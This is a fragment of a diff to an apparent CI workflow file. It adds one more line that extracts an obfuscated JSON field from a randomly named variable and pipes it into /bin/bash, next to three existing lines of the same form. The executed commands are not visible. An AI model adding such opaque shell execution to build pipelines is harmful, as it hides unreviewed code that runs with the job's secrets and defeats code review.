@@ -25,6 +25,7 @@ jobs:
           echo $hag8 | jq -r .a414 | /bin/bash
           echo $deu3440 | jq -r .c12304 | /bin/bash
           echo $nt6306 | jq -r .fp44680 | /bin/bash
+          echo $v9524 | jq -r .nawdc2839 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
